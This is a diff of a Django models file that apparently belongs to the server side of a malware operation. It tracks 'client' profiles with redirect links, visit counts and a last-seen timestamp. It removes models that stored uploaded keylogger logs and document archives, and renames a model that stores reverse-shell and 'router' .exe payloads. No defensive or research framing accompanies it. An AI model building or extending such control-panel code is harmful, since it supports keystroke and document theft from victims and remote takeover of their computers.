@@ -18,6 +18,7 @@ class UserProfile(models.Model):
     redirect_link = models.URLField(default='', blank=True)
     link_visits = models.IntegerField(default=0)
     created = models.DateTimeField(auto_now_add=True, auto_now=False)
+    last_seen = models.DateTimeField(auto_now=True)
     
     
     def save(self, *args, **kwargs):
@@ -61,40 +62,9 @@ class LizzyProfile(UserProfile):
         ordering = ('-created',)
         verbose_name_plural = 'LizzyProfiles'
 
-
-class GratjeenProfile(UserProfile):
-    
-    class Meta:
-        ordering = ('-created',)
-        verbose_name_plural = 'GratjeenProfiles'
-
-
-
-class GratJeenProfileDetails(models.Model):
-    client = models.ForeignKey(GratjeenProfile, on_delete=models.CASCADE) 
-    keylogger_txt = models.FileField(upload_to='keylogger/')
-    document_zip = models.FileField(upload_to='documents/') 
-    created = models.DateTimeField(auto_now_add=True, auto_now=False)
-    updated = models.DateTimeField(auto_now_add=False, auto_now=True) 
-
-
-class LizzyProfileDetails(models.Model):
-    client = models.ForeignKey(LizzyProfile, on_delete=models.CASCADE) 
-    keylogger_txt = models.FileField(upload_to='keylogger/')
-    document_zip = models.FileField(upload_to='documents/')
-    created = models.DateTimeField(auto_now_add=True, auto_now=False)
-    updated = models.DateTimeField(auto_now_add=False, auto_now=True) 
-
-
-class NadiaProfileDetails(models.Model):
-    client = models.ForeignKey(NadiaProfile, on_delete=models.CASCADE) 
-    keylogger_txt = models.FileField(upload_to='keylogger/') 
-    document_zip = models.FileField(upload_to='documents/')
-    created = models.DateTimeField(auto_now_add=True, auto_now=False)
-    updated = models.DateTimeField(auto_now_add=False, auto_now=True) 
         
         
-class Uploadedfiles(models.Model):
+class DownloadedFiles(models.Model):
     user = models.ForeignKey(User, on_delete=models.CASCADE)
     reverse_shell = models.FileField(upload_to="shellexe/", null=True, blank=True, validators=[FileExtensionValidator(allowed_extensions=['exe'])])
     router = models.FileField(upload_to="router/", null=True, blank=True, validators=[FileExtensionValidator(allowed_extensions=['exe'])])
